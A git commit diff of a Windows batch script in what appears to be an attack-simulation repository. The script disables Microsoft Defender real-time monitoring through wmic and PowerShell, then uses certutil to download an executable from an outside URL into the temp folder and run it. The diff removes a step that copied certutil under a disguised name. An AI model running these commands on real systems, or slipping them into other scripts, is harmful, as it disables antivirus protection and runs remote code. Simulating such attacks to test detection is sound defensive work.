f41de14e0c5971f87bbf0799cfb7c6c85c9f1bdf
Kijo Ninja <120234772+LearningKijo@users.noreply.github.com>
2024-03-26 18:20:16 +0900

    Update dev6.bat

--- DEV/SimulationRepo/dev6.bat
+++ DEV/SimulationRepo/dev6.bat
@@ -1,6 +1,4 @@
 wmic process call create "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring 1\""
 timeout /t 10 /nobreak >nul
-copy C:\Windows\System32\certutil.exe C:\Windows\System32\KJNinja.exe
-timeout /t 3 /nobreak >nul
-KJNinja.exe -urlcache -f "https://aka.ms/ioavtest" "%Temp%\validatecloud.exe"
+certutil.exe -urlcache -f "https://aka.ms/ioavtest" "%Temp%\validatecloud.exe"
 cmd /c "%Temp%\validatecloud.exe"
